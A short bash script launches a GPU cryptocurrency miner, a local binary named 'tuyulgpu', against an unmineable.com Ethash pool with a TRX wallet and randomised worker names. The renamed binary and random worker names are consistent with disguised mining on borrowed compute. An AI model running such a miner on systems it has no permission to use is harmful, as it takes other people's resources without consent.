#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM
WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
chmod +x tuyulgpu

./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --daglim 4G
